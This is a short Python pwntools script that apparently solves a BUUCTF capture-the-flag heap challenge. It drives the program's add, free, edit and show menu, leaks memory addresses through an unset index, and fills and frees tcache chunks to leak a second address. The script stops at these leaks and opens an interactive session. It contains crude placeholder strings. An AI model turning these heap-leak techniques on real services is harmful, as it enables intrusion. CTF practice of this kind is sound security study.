from pwn import *
r = remote('node3.buuoj.cn',28066)
context.log_level = 'debug'
def add(index,size,content):
	r.sendlineafter('input:','1')
	r.sendlineafter('idx:',str(index))
	r.sendlineafter('):',str(size))
	r.sendlineafter('content:',content)
#(1.0x10 2.0xf0 3.0x300 4.0x400)

def free(index):
	r.sendlineafter('input:','2')
	r.sendlineafter(':',str(index))

def edit(index,content):
	r.sendlineafter('input:','3')
	r.sendlineafter('idx:',str(index))
	r.sendlineafter(':content',content)

def show(index):
	r.sendlineafter('input:','4')
	r.sendlineafter('idx:',str(index))

def gitf(fuck):
	r.sendlineafter('input:','666')
	r.sendline(fuck)

show(3)
leak = r.recvuntil(' \nDone!',drop=True).ljust(8,'\x00')
leak = u64(leak)
log.info(hex(leak))

for i in range(10):
	add(i,2,'fuck')
for i in range(8):
	free(i)

show(7)
leak = r.recvuntil(' \nDone!',drop=True).ljust(8,'\x00')
leak = u64(leak)
log.info(hex(leak))

r.interactive()